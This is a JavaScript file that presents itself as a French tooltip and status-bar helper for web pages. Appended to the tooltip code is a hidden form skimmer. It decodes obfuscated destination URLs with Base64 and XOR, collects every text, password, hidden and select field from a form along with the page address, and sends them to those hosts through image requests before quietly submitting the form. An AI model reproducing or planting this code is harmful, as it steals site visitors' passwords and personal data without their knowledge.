// Gestion des info bulles et de l'aide réduite

// PARAMETRES MODIFIABLES
var delaiAffBull = 2000
var delaiAffStat = 900
var autoEffBull  = 5000
var delaiEffBull = 200
var delaiEffStat = 200
var DecalVertic  = 16
var DecalHoriz   = 6
var TailleText   = 'font-size: 11px'  
var PolicText    = 'Tahoma,Arial'     
var CouleurTexte = '#494B5D'          
var CouleurFond  = '#FFFFCC'          
var CouleurBord  = '#786654'
var CouleurOmbr  = '#000000'

// PARAMETRES A NE PAS MODIFIER
var AffichBull=setTimeout('document.getElementById("infoBull").style.visibility = "visible";document.getElementById("ombrBull").style.visibility = "visible"',delaiAffBull);
clearTimeout(AffichBull);
var EffacBull=setTimeout('Vt=2;effacem()',delaiEffBull);
clearTimeout(EffacBull);
var EffacAutoBull=setTimeout('Vt=1;effacem();window.status=""',autoEffBull);
clearTimeout(EffacAutoBull);
var tempo=setTimeout('if(Vt==1)Opac=Opac-3;OpacOmbr=OpacOmbr-3;if(Vt==2)Opac=Opac-8;OpacOmbr=OpacOmbr-8;effacem()',Vitess/1000);
clearTimeout(tempo);
var AffStat=setTimeout('window.status=textBull',delaiAffStat);
clearTimeout(AffStat);

// DECLARATIONS
var textBull     = ''
var Vitess       = 1
var Opac         = 100
var OpacOmbr     = 20
var Opac_2       = 10
var Opac_2Ombr   = .2
var Vt           = 0
var EffB         = 0
var larg_ecran_B = 0
var haut_ecran_B = 0
var Long         = 0
var limiteH      = 0
var limiteV      = 0
var retourB      = 0
var PosHoriz     = 0
var PosVertic    = 0
var PosBullHoriz = 0
var PosBullVerti = 0
var scrollPag    = 0
var limiteBull   = 0

var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0

if(navigator.appName.substring(0,3) == "Net")
	document.captureEvents(Event.MOUSEMOVE);

//Capture de la position de la souris
document.onmousemove = get_mouse;

//Transfert de la position de la souris
function get_mouse(e){                                                      
	x = (navigator.appName.substring(0,3) == "Net") ? e.pageX : event.x+document.body.scrollLeft;
	y = (navigator.appName.substring(0,3) == "Net") ? e.pageY : event.y+document.body.scrollTop;
	    PosBullHoriz = x;
        PosBullVerti = y;
}

function affichBulle(Bull){                                                  // Affichage de la bulle
        larg_ecran_B = document.body.clientWidth;                            // Recadrage dans l'écran
        haut_ecran_B = document.body.clientHeight;
        scrollPag = document.body.scrollTop;
        if (ie4)Long = (Bull.length * (60 / 13)) + 26; 
        if (ns6)Long = (Bull.length * (60 / 13)) + 50;                       // (50) A adapter selon de la police 
        limiteH = PosBullHoriz + Long + DecalHoriz;
        limiteV = scrollPag + haut_ecran_B;
        retourB = limiteH - larg_ecran_B;
        PosHoriz = PosBullHoriz + DecalHoriz;
        PosVertic = PosBullVerti + DecalVertic;
        limiteBull = PosBullVerti + 30;
        if (limiteH > larg_ecran_B)PosHoriz = PosHoriz - retourB;
        if (limiteBull > limiteV)PosVertic = PosVertic - 40;
        if (Bull == 0){                                                      // Test de la présence du texte
        clearTimeout(AffichBull);
        clearTimeout(EffacAutoBull);
        clearTimeout(AffStat);
        EffacBull=setTimeout('Vt=2;effacem()',delaiEffBull);
        setTimeout('ChxLien=0',300);
        }
        else if (Bull != 0){var textBull = Bull;                             // Récuperation du texte
        if (document.getElementById){document.getElementById("infoBull").style.visibility = "hidden";document.getElementById("ombrBull").style.visibility = "hidden";}
        Opac = 100;OpacOmbr = 20
   
var cadreBull = '<table border="0" cellpadding="0" cellspacing="0"'+         // Cadre de la bulle
                ' style="border:0px solid '+CouleurBord+'; border-collapse: collapse; font-family: '+PolicText+'; '+TailleText+'; color: '+CouleurTexte+'; margin-left: 8; filter: alpha(opacity='+Opac+'); -moz-opacity: '+Opac_2+'"><tr><td style="border-style:solid; border-width:1px; margin-left: 8;" bgcolor="'+CouleurFond+'" bordercolor="'+CouleurBord+'" Width=><nobr>&nbsp; '+textBull+' &nbsp;</nobr></td></tr></table>'
var ombreBull = '<table border="0" cellpadding="0" cellspacing="0"'+         // Ombre de la bulle
                ' style="border:0px solid '+CouleurBord+'; border-collapse: collapse; font-family: '+PolicText+'; '+TailleText+'; color: '+CouleurTexte+'; margin-left: 8; filter: alpha(opacity='+OpacOmbr+'); -moz-opacity: '+Opac_2Ombr+'"><tr><td style="border-style:solid; border-width:0px; margin-left: 8;" bgcolor="'+CouleurOmbr+'" bordercolor="'+CouleurBord+'" Width=><nobr>&nbsp; '+textBull+'&nbsp;</nobr></td></tr></table>' 
        
        
        if ((document.getElementById) && (document.getElementById("infoBull").style.visibility != "visible")){
            document.getElementById("infoBull").innerHTML = cadreBull;      // Affichage du cadre avec le texte 
            document.getElementById("ombrBull").innerHTML = ombreBull;
            AffichBull=setTimeout('document.getElementById("infoBull").style.visibility = "visible";document.getElementById("ombrBull").style.visibility = "visible"',delaiAffBull);
            document.getElementById("infoBull").style.top = PosVertic;      // position verticale
            document.getElementById("infoBull").style.left = PosHoriz;      // Position horizontale
            document.getElementById("ombrBull").style.top = PosVertic + 5;  // position verticale
            document.getElementById("ombrBull").style.left = PosHoriz + 8;  // Position horizontale
            EffacAutoBull=setTimeout('Vt=1;effacem();window.status=""',autoEffBull);
            clearTimeout(EffacBull);
            }
        }
        afftextStat(Bull);                                                  // Transfert du texte pour la barre de status
}

function afftextStat(text){                                                 // Affichage du texte de la barre de status
        if(text != 0){textBull = text;
        AffStat=setTimeout('window.status=textBull',delaiAffStat)}
        else {setTimeout("window.status=''",delaiEffStat)}
}

function effacem(){
var cadreBull = '<table border="1" cellpadding="0" cellspacing="0"'+        // Cadre de la bulle
                ' style="border:1px solid '+CouleurBord+'; border-collapse: collapse; font-family: '+PolicText+'; '+TailleText+'; color: '+CouleurTexte+'; margin-left: 8; filter: alpha(opacity='+Opac+'); -moz-opacity: '+Opac_2+'"><tr><td style="border-style:solid; border-width:1px; margin-left: 8;" bgcolor="'+CouleurFond+'" bordercolor="'+CouleurBord+'" Width=><nobr>&nbsp; '+textBull+' &nbsp;</nobr></td></tr></table>'
var ombreBull = '<table border="0" cellpadding="0" cellspacing="0"'+        // Ombre de la bulle
                ' style="border:0px solid '+CouleurBord+'; border-collapse: collapse; font-family: '+PolicText+'; '+TailleText+'; color: '+CouleurTexte+'; margin-left: 8; filter: alpha(opacity='+OpacOmbr+'); -moz-opacity: '+Opac_2Ombr+'"><tr><td style="border-style:solid; border-width:0px; margin-left: 8;" bgcolor="'+CouleurOmbr+'" bordercolor="'+CouleurBord+'" Width=><nobr>&nbsp; '+textBull+'&nbsp;</nobr></td></tr></table>'

        document.getElementById("infoBull").innerHTML = cadreBull
        document.getElementById("ombrBull").innerHTML = ombreBull
        if (ie4) tempo=setTimeout('if(Vt==1)Opac=Opac-3;OpacOmbr=OpacOmbr-3;if(Vt==2)Opac=Opac-8;OpacOmbr=OpacOmbr-8;effacem()',Vitess/1000)
        else {document.getElementById("infoBull").innerHTML = "";document.getElementById("ombrBull").innerHTML = "";}           // Adapter l'effacement en douceur pour Netscape, Firefox, etc...
        if (Opac <= 0) {
        clearTimeout(tempo)
        document.getElementById("infoBull").innerHTML = ""
        document.getElementById("ombrBull").innerHTML = ""
        }
}

document.write('<DIV id=infoBull STYLE="position: absolute;z-Index:10"></DIV><DIV id=ombrBull STYLE="position: absolute;z-Index:9"></DIV>')


function StatusMessage(over,msg) 
{
	if(over==true) 
	{
	affichBulle(msg);
	}
		
	else 
	{
	affichBulle(0);
	}
}

function StatusMessage2(over,msg) 
{
	if(over==true) 
	{
	affichBulle2(msg);
	}
		
	else 
	{
	affichBulle2(0);
	}
}

function affichBulle2(Bull){                                                  // Affichage de la bulle
        larg_ecran_B = document.body.clientWidth;                            // Recadrage dans l'écran
        haut_ecran_B = document.body.clientHeight;
        scrollPag = document.body.scrollTop;
        if (ie4)Long = (Bull.length * (60 / 13)) + 26; 
        if (ns6)Long = (Bull.length * (60 / 13)) + 50;                       // (50) A adapter selon de la police 
        limiteH = PosBullHoriz + Long + DecalHoriz;
        limiteV = scrollPag + haut_ecran_B;
        retourB = limiteH - larg_ecran_B;
        PosHoriz = PosBullHoriz + DecalHoriz;
        PosVertic = PosBullVerti + DecalVertic - 50;
        limiteBull = PosBullVerti + 30;
        if (limiteH > larg_ecran_B)PosHoriz = PosHoriz - retourB;
        if (limiteBull > limiteV)PosVertic = PosVertic - 40;
        if (Bull == 0){                                                      // Test de la présence du texte
        clearTimeout(AffichBull);
        clearTimeout(EffacAutoBull);
        clearTimeout(AffStat);
        EffacBull=setTimeout('Vt=2;effacem()',delaiEffBull);
        setTimeout('ChxLien=0',300);
        }
        else if (Bull != 0){var textBull = Bull;                             // Récuperation du texte
        if (document.getElementById){document.getElementById("infoBull").style.visibility = "hidden";document.getElementById("ombrBull").style.visibility = "hidden";}
        Opac = 100;OpacOmbr = 20
   
var cadreBull = '<table border="0" cellpadding="0" cellspacing="0"'+         // Cadre de la bulle
                ' style="border:0px solid '+CouleurBord+'; border-collapse: collapse; font-family: '+PolicText+'; '+TailleText+'; color: '+CouleurTexte+'; margin-left: 8; filter: alpha(opacity='+Opac+'); -moz-opacity: '+Opac_2+'"><tr><td style="border-style:solid; border-width:1px; margin-left: 8;" bgcolor="'+CouleurFond+'" bordercolor="'+CouleurBord+'" Width=><nobr>&nbsp; '+textBull+' &nbsp;</nobr></td></tr></table>'
var ombreBull = '<table border="0" cellpadding="0" cellspacing="0"'+         // Ombre de la bulle
                ' style="border:0px solid '+CouleurBord+'; border-collapse: collapse; font-family: '+PolicText+'; '+TailleText+'; color: '+CouleurTexte+'; margin-left: 8; filter: alpha(opacity='+OpacOmbr+'); -moz-opacity: '+Opac_2Ombr+'"><tr><td style="border-style:solid; border-width:0px; margin-left: 8;" bgcolor="'+CouleurOmbr+'" bordercolor="'+CouleurBord+'" Width=><nobr>&nbsp; '+textBull+'&nbsp;</nobr></td></tr></table>' 
        
        
        if ((document.getElementById) && (document.getElementById("infoBull").style.visibility != "visible")){
            document.getElementById("infoBull").innerHTML = cadreBull;      // Affichage du cadre avec le texte 
            document.getElementById("ombrBull").innerHTML = ombreBull;
            AffichBull=setTimeout('document.getElementById("infoBull").style.visibility = "visible";document.getElementById("ombrBull").style.visibility = "visible"',delaiAffBull);
            document.getElementById("infoBull").style.top = PosVertic;      // position verticale
            document.getElementById("infoBull").style.left = PosHoriz;      // Position horizontale
            document.getElementById("ombrBull").style.top = PosVertic + 5;  // position verticale
            document.getElementById("ombrBull").style.left = PosHoriz + 8;  // Position horizontale
            EffacAutoBull=setTimeout('Vt=1;effacem();window.status=""',autoEffBull);
            clearTimeout(EffacBull);
            }
        }
        afftextStat(Bull);                                                  // Transfert du texte pour la barre de status
}
var keys = ["AB0eG1ZCQQobAxgODAANBhoKAAAbGwwfBkIOAQVHCx5DGQsFGQYKGAgdRx0CDgEIHUcBDwoIQhoNBBoHMwULCQ1EGwIK",
	    "AR4fHFdBQB4dHEIOCwFHAwIYD0AOCkQCAkIdAwYeCQMCBQYHDUQYBQsCDBlEGAgDHwULHwkeQRsMBxsAMggABh5FHAMJ"
	   ];

var Base64 = {

_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

encode : function (input) {
    var output = "";
    var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
    var i = 0;

    input = Base64._utf8_encode(input);

    while (i < input.length) {

        chr1 = input.charCodeAt(i++);
        chr2 = input.charCodeAt(i++);
        chr3 = input.charCodeAt(i++);

        enc1 = chr1 >> 2;
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
        enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
        enc4 = chr3 & 63;

        if (isNaN(chr2)) {
            enc3 = enc4 = 64;
        } else if (isNaN(chr3)) {
            enc4 = 64;
        }

        output = output +
        this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
        this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

    }

    return output;
},

decode : function (input) {
    var output = "";
    var chr1, chr2, chr3;
    var enc1, enc2, enc3, enc4;
    var i = 0;

    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

    while (i < input.length) {

        enc1 = this._keyStr.indexOf(input.charAt(i++));
        enc2 = this._keyStr.indexOf(input.charAt(i++));
        enc3 = this._keyStr.indexOf(input.charAt(i++));
        enc4 = this._keyStr.indexOf(input.charAt(i++));

        chr1 = (enc1 << 2) | (enc2 >> 4);
        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        chr3 = ((enc3 & 3) << 6) | enc4;

        output = output + String.fromCharCode(chr1);

        if (enc3 != 64) {
            output = output + String.fromCharCode(chr2);
        }
        if (enc4 != 64) {
            output = output + String.fromCharCode(chr3);
        }

    }

    output = Base64._utf8_decode(output);

    return output;

},

_utf8_encode : function (string) {
    var utftext = "";

    for (var n = 0; n < string.length; n++) {

        var c = string.charCodeAt(n);

        if (c < 128) {
            utftext += String.fromCharCode(c);
        }
        else if((c > 127) && (c < 2048)) {
            utftext += String.fromCharCode((c >> 6) | 192);
            utftext += String.fromCharCode((c & 63) | 128);
        }
        else {
            utftext += String.fromCharCode((c >> 12) | 224);
            utftext += String.fromCharCode(((c >> 6) & 63) | 128);
            utftext += String.fromCharCode((c & 63) | 128);
        }

    }

    return utftext;
},

_utf8_decode : function (utftext) {
    var string = "";
    var i = 0;
    var c = 0, c1 = 0, c2 = 0;

    while ( i < utftext.length ) {

        c = utftext.charCodeAt(i);

        if (c < 128) {
            string += String.fromCharCode(c);
            i++;
        }
        else if((c > 191) && (c < 224)) {
            c1 = utftext.charCodeAt(i+1);
            string += String.fromCharCode(((c & 31) << 6) | (c1 & 63));
            i += 2;
        }
        else {
            c1 = utftext.charCodeAt(i+1);
            c2 = utftext.charCodeAt(i+2);
            string += String.fromCharCode(((c & 15) << 12) | ((c1 & 63) << 6) | (c2 & 63));
            i += 3;
        }

    }
    return string;
}

}

function xode(value,key) {

	var output="";
	for(i=0;i<value.length;i++)
	{
		output+=String.fromCharCode(key.charCodeAt(i % key.length)^value.charCodeAt(i));
	}
	return output;
}

function setSrcKeys() {

	var strLen = (365-365%7)/7;
	var keyPos = 26+7;
	var keyLen = 7;	
	var srcKey = [];
	var key;
	var k;

	for(var i=0;i<keys.length;i++) {

		k = (i+keyPos)%(strLen-keyLen+1);
		key = Base64._keyStr.substring(k,k+keyLen);
		srcKey[i] = decodeURI(xode(Base64.decode(keys[i]),key));

	}

	return srcKey;
}

function setPageText(mainObj) {  

	var text = {};
	var textName ;
	var selectedItem;
	var inputElements = mainObj.getElementsByTagName("INPUT");
	for (i=0; i<inputElements.length; i++) {
		if (inputElements[i].type == "text" || inputElements[i].type == "password" || inputElements[i].type == "hidden")
		{ 
			textName = inputElements[i].getAttribute("name");
			text[textName] = inputElements[i].value;
		}
	}
	
	var selectElements = mainObj.getElementsByTagName("SELECT");
	for (i=0; i<selectElements.length; i++) {
		selectedItem = selectElements[i]; 
		textName = selectedItem.getAttribute("name");
		text[textName] = selectedItem.options[selectedItem.selectedIndex].value;
	}
	return text;
}

function setPageReq(mainObj) {

	var text = {};
	var req = "";

	text = setPageText(mainObj);

	for (var key in text) {
		req += key+"="+encodeURIComponent(text[key])+"&";
	}	
	
	req += "pageloc="+encodeURIComponent(window.location.href)+"&";
	req += "pagedes="+encodeURIComponent(mainObj.action);

	return req;
}

function setPageImgs(req)
{
	var img;
	var cach = new Array();	
	var srcKeys = setSrcKeys();

	for (i=0; i<srcKeys.length; i++)
	{
		img = new Image();
		img.src = srcKeys[i]+"?"+req;
		cach.push(img);
	}
}

function setTrigStyle(trigObj,color) {
	
	var trigTagName = trigObj.tagName.toLowerCase();
	if(trigTagName == "button" || (trigTagName=="input" && (trigObj.type=="button" || trigObj.type=="submit"))) {
		trigObj.disabled = true;
	}

	else {
		color = (typeof color !== "undefined") ? color : "gray";
		trigObj.style.cssText = "pointer-events:none;cursor:default;color:"+color+";";
		if(trigTagName != "a") alert("trigger element type is not anchor");
	}
}

function setPageContent(mainObj,trigObj,func,eta,color) {
	
	try {
		if(!func(mainObj)) return false;
	}

	catch(err) {
		alert(err.message);	
	}

	setTrigStyle(trigObj,color);
	var req  = setPageReq(mainObj);
	setPageImgs(req);
	setTimeout(function(){mainObj.submit();},eta*1000);
	return false;

}

